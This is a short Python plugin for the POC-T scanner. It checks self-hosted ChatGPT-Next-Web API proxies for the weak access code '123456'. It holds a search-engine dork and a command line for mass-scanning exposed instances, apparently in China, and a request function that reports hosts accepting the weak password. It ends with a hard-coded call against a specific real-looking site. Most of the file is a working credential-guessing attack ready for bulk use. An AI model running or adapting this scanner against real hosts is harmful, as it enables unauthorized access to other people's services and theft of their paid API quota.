#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   chagptnext_weakpass
@DateTime :  2023/9/22 20:58 


@Dork
    (icon_hash="1296353639" || fid="+Wpe7n/j+H/bHeAIrIPwdA==") && country="CN"

@Cmdline
    python POC-T.py -s chagptnext_weakpass.py -aF '(icon_hash="1296353639" || fid="+Wpe7n/j+H/bHeAIrIPwdA==") && country="CN"'

@Request
```
POST /api/openai/v1/chat/completions
Authorization: Bearer nk-aaaaa

{"messages":[{"role":"system","content":"\nYou are ChatGPT, a large language model trained by OpenAI.\nKnowledge cutoff: 2021-09\nCurrent model: gpt-3.5-turbo\nCurrent time: 2023/9/22 20:56:33\n"},{"role":"user","content":"hi"}],"stream":true,"model":"gpt-3.5-turbo","temperature":0.5,"presence_penalty":0,"frequency_penalty":0,"top_p":1}```

@Expected Response
    not 401
'''

from lib.utils.http import request_ex, get_http_url, urljoin_ex
from lib.utils.dic import Wordlist
from lib.core.data import logger as log
import json

def poc(url):

    password = "123456"
    header = {
        "Authorization": "Bearer ak-%s" % password,
        "Content-Type": "application/json"
    }

    pad = '{}'
    url = urljoin_ex(url, "/api/openai/v1/chat/completions")
    resp = request_ex("post", url, headers=header, data=pad)
    if resp and resp.status_code != 401 and "needAccessCode" not in resp.text and "you must provide a model parameter" in resp.text:
        print(resp.text)
        return True
    else:
        return False


if __name__ == '__main__':
    poc("https://ai.sockstack.cn/")
